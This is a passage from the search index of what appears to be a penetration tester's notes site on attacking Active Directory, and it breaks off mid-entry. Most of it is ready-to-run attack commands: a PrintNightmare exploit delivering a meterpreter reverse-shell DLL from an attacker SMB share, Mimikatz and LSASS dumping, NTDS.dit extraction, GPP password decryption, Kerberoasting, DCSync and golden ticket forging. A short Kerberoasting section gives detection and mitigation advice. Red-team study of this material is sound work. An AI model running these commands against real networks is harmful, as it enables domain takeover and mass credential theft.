attempt)</p>","tags":["Initial-Access","LLMNR","NETBIOS","SMB","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/ZeroLogon/","title":"ZeroLogon","text":""},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/ZeroLogon/#identify","title":"Identify","text":"<p>remote <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M zerologon\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/","title":"\ud83d\udc7b PrintNightmare","text":"<p>https://github.com/cube0x0/CVE-2021-1675</p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/#identify","title":"Identify","text":"<p><pre><code> rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre> <pre><code>REG QUERY \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\"\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\n    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0\n    NoWarningNoElevationOnInstall    REG_DWORD    0x1\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/2.%20Initial%20Compromise/%F0%9F%91%BB%20PrintNightmare/#exploit","title":"Exploit","text":"<p>You need bros version of impacket <pre><code>pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n</code></pre> Generate DLL payload <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=8080 -f dll &gt; timsync.dll\n</code></pre> Host payload on smbserver <pre><code>sudo smbserver.py -smb2support ITShare share\n</code></pre> Start listener, execute payload <pre><code>sudo python3 CVE-2021-1675.py domain.local/user:'password'@&lt;dcip&gt; '\\\\&lt;attackhost&gt;\\ITShare\\timesync.dll'\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/","title":"Credential Dumping","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#locally","title":"Locally","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#mimikatz","title":"Mimikatz","text":"<p>Dump all <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> Output to file with log <pre><code>.\\mimikatz.exe \"log C:\\path\\to\\mimikatz.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"\n</code></pre> Output to file with redirection <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit &gt; C:\\path\\to\\mimi-output.txt\n</code></pre> Dump SAM (Local passwords) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam /patchlsadsu\" exit\n</code></pre> Dump LSA (DC) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" exit\n</code></pre> Target krbtgt (for golden ticket generation) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject /name:krbtgt\" exit\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#rubeus","title":"Rubeus","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#kerberos-tickets","title":"Kerberos Tickets","text":"<p>List cached tickets - Non elevated: List current users - Elevated: List everyones <pre><code>Rubeus.exe triage\n</code></pre> Specify service <pre><code>Rubeus.exe triage /service:ldap\n</code></pre> Dump tickets - Non elevated: dump current users <pre><code>Rubeus.exe dump\n</code></pre> Dump all tickets by targeting krbtgt (Elevated) <pre><code>Rubeus.exe dump /service:krbtgt\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#alternative-methods","title":"Alternative Methods","text":"<p>Save SAM and SYSTEM/SECURITY, extract locally</p> <p>note</p> <p>we will only need hklm\\sam &amp; hklm\\system, but hklm\\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts</p> <p><pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre> Dump locally <pre><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre> Dump lsass with task manager</p> <p>GUI access required</p> <p><code>Open Task Manager</code> &gt; <code>Select the Processes tab</code> &gt; <code>Find &amp; right click the Local Security Authority Process</code> &gt; <code>Select Create dump file</code> **A file called <code>lsass.DMP</code> is created and saved in:</p> <pre><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\n</code></pre> <p>Rundll32.exe &amp; Comsvcs.dll Method</p> <p>Will absolutely be flagged by AV/EDR</p> <p>Get lsass PID <pre><code>tasklist /svc\n</code></pre> <pre><code>Get-Process lsass\n</code></pre> Create dumpfile with rundll32 <pre><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre></p> <p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\\lsass.dmp</code>).</p> <p>Use Pypykatz to Extract Credentials (on attack box) <pre><code>pypykatz lsa minidump lsass.dmp \n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#ntdsdit-dumping","title":"NTDS.dit Dumping","text":"<p>(Need DA or local admin on DC) Shadow Copy <pre><code>vssadmin CREATE SHADOW /For=C:\n</code></pre> Copying NTDS.dit from the VSS <pre><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre> Dump locally <pre><code>impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#remotely","title":"Remotely","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#netexec","title":"netexec","text":"<p>LSA (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --lsa\n</code></pre> SAM (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --sam\n</code></pre> NTDS (DA or local admin on DC required) <pre><code>nxc smb 10.129.201.57 -u '' -p '' --ntds\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Dumping/#impacket","title":"impacket","text":"<p>Dump everything (local admin required) <pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'IP' -dc-ip &lt;DCIP&gt;\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/","title":"Credential Hunting","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#lazagne","title":"LaZagne","text":"<p>https://github.com/AlessandroZ/LaZagne Hunt for passwords stored in commonly used software. All modules <pre><code>laZagne.exe all\nlaZagne.exe all -output C:\\Windows\\Tasks\n</code></pre> Decrypt domain creds (requires current users password) <pre><code>laZagne.exe all -password &lt;PASS&gt;\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#snaffler","title":"Snaffler","text":"<p>https://github.com/SnaffCon/Snaffler Will spider shares and readable directories for common credential patterns <pre><code>Snaffler.exe -s -d domain.local -o snaffler.log -v data\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#seatbelt","title":"Seatbelt","text":"<p>https://github.com/GhostPack/Seatbelt performs security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. Sometimes finding creds. <pre><code>Seatbelt.exe -group=all -outputfile=\"C:\\Windows\\Tasks\\all.txt\"\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#manual-approach","title":"Manual Approach","text":"<p><pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre> places we should keep in mind when credential hunting:</p> <ul> <li>Passwords in Group Policy in the SYSVOL share</li> <li>Passwords in scripts in the SYSVOL share</li> <li>Password in scripts on IT shares</li> <li>Passwords in web.config files on dev machines and IT shares</li> <li>unattend.xml</li> <li>Passwords in the AD user or computer description fields</li> <li>KeePass databases --&gt; pull hash, crack and get loads of access.</li> <li>Found on user systems and shares</li> <li>Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint</li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Credential%20Hunting/#passwords-in-description-fields","title":"Passwords in description fields","text":"<p>Remote <pre><code>nxc ldap &lt;hostname&gt; -u &lt;user&gt; -p &lt;pass&gt; -M get-desc-users\n</code></pre> Local <pre><code>Import-Module powerview.ps1\n</code></pre> <pre><code>Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/GPP%20Password/","title":"GPP Password","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/GPP%20Password/#identify","title":"Identify","text":"<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains. Groups.xml</p> <p>cpassword field</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/GPP%20Password/#exploit","title":"Exploit","text":"<p><pre><code>nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin\n</code></pre> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Hash%20Cracking/","title":"Hash Cracking","text":"<p>NTLM <pre><code>hashcat -m 1000 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> NetNTLMv2 <pre><code>hashcat -m 5600 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> AS-REP (Kerberos 5 AS-REP etype 23) <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> Kerberoasted SPN (Kerberos 5 TGS-REP) <pre><code>hashcat -m 13100 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> - More ticket hash types can be found in the Kerberoasting sections.</p>","tags":["Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/","title":"Kerberoasting","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#technique","title":"Technique","text":"<p>Kerberoasting is a post-exploitation attack technique that targets Microsoft Active Directory. An attacker with credentials for any valid domain account (even a low-privilege one) can request Kerberos service tickets for accounts that have a Service Principal Name (SPN) configured.</p> <p>A portion of the returned ticket-granting service (TGS) ticket is encrypted with the NTLM hash of the service account's password. The attacker captures this ticket and takes it offline to crack the password using brute-force methods. Since the cracking happens offline, it does not generate failed login events on the network, making it a stealthy way to escalate privileges by compromising potentially high-value service accounts.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#prerequisites","title":"Prerequisites","text":"<p>Access Level: A valid Active Directory domain account. No special or elevated privileges are required.</p> <p>System State: The attacker must have network access to a Domain Controller to request tickets.</p> <p>Information: The attacker needs to identify user accounts (not computer accounts) that have an SPN configured.</p> <p>Misc: Your system time must be synced with the DC</p> <p>Linux:</p> <pre><code>sudo timedatectl set-ntp off\nsudo rdate -n &lt;targetDC&gt;\n</code></pre> <p>Windows:</p> <pre><code>NET TIME /DOMAIN\nNET TIME \\\\&lt;MACHINENAME&gt; /SET /Y\nNET TIME \\\\&lt;IP Address&gt; /SET /Y\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#considerations","title":"Considerations","text":"<p>Impact</p> <p>Successful cracking of a service account password can lead to significant privilege escalation and lateral movement. Service accounts are often misconfigured with excessive permissions (including Domain Admin) to ensure applications work, making them high-value targets.</p> <p>OPSEC</p> <ul> <li> <p>Noise: Requesting service tickets for many SPNs in a short period can trigger alerts. A single user requesting dozens or hundreds of TGS tickets (Event ID 4769) is highly anomalous.</p> </li> <li> <p>Weak Encryption: Modern tools like Rubeus allow you to request tickets using the weaker RC4 encryption algorithm (<code>-rc4opsec</code>). While this makes cracking easier, requesting a ticket with encryption type <code>0x17</code> (RC4-HMAC) in an environment that defaults to AES is a major red flag for defenders.</p> </li> <li> <p>Honeypots: Defenders can create fake service accounts with tempting SPNs (e.g., <code>sql_prod_admin_svc</code>) and monitor them. Any ticket requests for these honeypot accounts are an immediate indicator of compromise.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#requesting-a-ticket","title":"Requesting a ticket","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#powerviewps1","title":"PowerView.ps1","text":"<p>Identify kerberoastable users</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainUser * -spn | select samaccountname\n</code></pre> <p>Request ticket</p> <pre><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre> <pre><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#rubeus","title":"Rubeus","text":"<p>Get information about kerberoastable users</p> <pre><code>.\\Rubeus.exe kerberoast /stats\n</code></pre> <p>Kerberoast all users</p> <pre><code>.\\Rubeus.exe kerberoast \n</code></pre> <p>Useful flags:</p> <ul> <li><code>/outfile</code> outputs roasted hashes to the specified file, one per line.</li> <li><code>/tgtdeleg</code> accounts with AES enabled in <code>msDS-SupportedEncryptionTypes</code> will have RC4 tickets requested. (Doesn't work on &gt;= Win 2019)</li> <li><code>/rc4opsec</code> tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</li> <li><code>/simple</code> output tickets one per line in the terminal</li> <li><code>/nowrap</code> don't wrap new lines and output to terminal</li> <li><code>/user:&lt;DomainUser&gt;</code> specify user to kerberoast</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#impacket","title":"Impacket","text":"<p>Kerberoast all users</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request -dc-ip &lt;dcip&gt;\n</code></pre> <p>Kerberoast specific user</p> <pre><code>impacket-GetUserSPNs domain.local/username:'password' -request-user &lt;user&gt; -dc-ip &lt;dcip&gt;\n</code></pre> <p>Useful flags:</p> <ul> <li><code>-outputfile</code> send output to file</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#netexec","title":"NetExec","text":"<pre><code>nxc ldap &lt;IP&gt; -u 'user' -p '' --kerberoasting &lt;OUTFILE&gt;\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#powershell-mimikatz","title":"PowerShell + Mimikatz","text":"<p>Identify kerberoastable users.</p> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>setspn.exe -Q */*\n</code></pre> <pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.domain.local:1433\"\n</code></pre> <pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list \n</code></pre> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n\n</code></pre> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <pre><code>python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#cracking-a-ticket","title":"Cracking a ticket","text":"Encryption Type (etype) Name / Algorithm Hashcat Mode Notes / Where Seen <code>23</code> RC4-HMAC (arcfour-hmac-md5) 13100 Default for older AD, common in Kerberoasting. Weak, fastest to crack. <code>17</code> AES128-CTS-HMAC-SHA1-96 19600 Seen when RC4 is disabled; newer/modern service accounts. <code>18</code> AES256-CTS-HMAC-SHA1-96 19700 Stronger; common when \"AES only\" enforced. <code>3</code> DES-CBC-MD5 Obsolete (no current Hashcat mode) Legacy, should be disabled. <code>RC4-HMAC-OLD</code> / <code>etype 24</code> RC4-HMAC with old salt usage (rare) Use 13100 Rare edge cases, still cracks with RC4 mode.","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>None</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#detection","title":"Detection","text":"<ul> <li> <p>Event ID 4769: A Kerberos service ticket was requested</p> </li> <li> <p>Requests where the Ticket Encryption Type is 0x17 (RC4). In a modern environment, this should be rare</p> </li> <li> <p>Requests for service tickets from unusual workstations or for accounts that rarely see this activity.</p> </li> <li> <p>LDAP queries that search for accounts with an SPN like <code>(servicePrincipalName=*)</code></p> </li> <li> <p>Create a honey account and make a custom alert for tickets requested for that account</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Kerberoasting/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Strong Passwords: This is the most effective mitigation. Enforce a strong password policy for service accounts</p> </li> <li> <p>Use Group Managed Service Accounts: gMSAs are the gold standard. Their passwords are 240 characters long, complex, and automatically managed and rotated by Active Directory</p> </li> <li> <p>Protected Users Group: Add high-value accounts (including service accounts where possible) to the \"Protected Users\" security group. This enforces stronger security controls, such as disabling NTLM and preventing the use of weaker Kerberos encryption types.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558003","#stage/privilege-escalation","#stage/lateral-movement","#os/windows","#os/linux","#tool/rubeus","#tool/impacket","#tool/powerview","#tool/hashcat"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/","title":"Unconstrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#identify","title":"Identify","text":"<p>Linux - remote <pre><code>nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation\n</code></pre> Windows - local <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname\n</code></pre></p> <p>Domain Controllers are always permitted for unconstrained delegation.</p>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#exploit","title":"Exploit","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/3.%20Credential%20Theft/Unconstrained%20Delegation/#force-dc-to-auth-to-our-box-and-steal-tgt","title":"Force DC to auth to our box and steal tgt","text":"<p>Monitor for tickets with Rubeus <pre><code>Rubeus.exe monitor /interval:10 /nowrap\n</code></pre> Run https://github.com/cube0x0/SharpSystemTriggers to coerce authentication <pre><code>SharpSpoolTrigger.exe dc01.lab.local web.dev.lav.local\n</code></pre> Where:</p> <ul> <li>DC01 is the \"target\".</li> <li>WEB is the \"listener\". Rebeus should capture a ticket</li> </ul>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/DCSync/","title":"DCSync","text":"","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/DCSync/#identify","title":"Identify","text":"<p>Do you control an object with the <code>DS-Replication-Get-Changes</code> ACL?</p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/DCSync/#exploit","title":"Exploit","text":"<p><pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC0IP&gt;'\n</code></pre> From windows <pre><code>runas /netonly /user:DOMAIN\\user powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\\administrator\n</code></pre></p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/Diamond%20Ticket/","title":"Diamond Ticket","text":"<p>Similar to a golden ticket in function but not in form. Instead of forging a new ticket, a diamond ticket is created by modifying fields of a previously granted ticket. This gives some opsec advantages because:</p> <ul> <li>TGS-REQ will have a AS-REQ preceding it.</li> <li>It will have all the correct details from the domain's Kerberos policy because it was issued by the DC</li> </ul>","tags":["Authenticated","Kerberos","OPSEC","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/Golden%20Ticket/","title":"Golden Ticket","text":"<p>forge a Kerberos Ticket Granting Ticket (TGT) with a domain's KRBTGT account hash, allowing an attacker to impersonate any user including domain admins without needing their credentials.</p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/Golden%20Ticket/#get-domain-sid","title":"Get domain SID","text":"<p>locally: <pre><code>(Get-ADDomain).DomainSID\n</code></pre> <pre><code>whoami /user # (domain SID is the part before the last hyphen (RID).)\n</code></pre> remotely: <pre><code>nxc ldap &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; --sid\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/Golden%20Ticket/#get-krbtgt-account-hash","title":"Get krbtgt account hash","text":"<p>locally - mimikatz <pre><code>lsadump::lsa /inject /name:krbtgt\n</code></pre> remotely - nxc <pre><code>nxc smb &gt;ip&gt; --local-auth -u '' -p '' --lsa --user krbtgt\nnxc smb &lt;dcip&gt; --local-auth -u '' -p '' --ntds --user krbtgt\n</code></pre> remotely - secretsdump <pre><code>impacket-secretsdump user:pass@10.0.0.35\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/4.%20Privilege%20Escalation/Domain/Golden%20Ticket/#generate-ticket","title":"Generate ticket","text":"<p>with mimikatz <pre><code>kerberos::golden /User:Administrator /domain:domain.local /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt hash&gt; /id:500 /ptt\n</code></pre> spawn shell with ticket <pre><code>misc::cmd\n</code></pre> Now we can use psexec for a shell anywhere <pre><code>psexec.exe  -accepteula 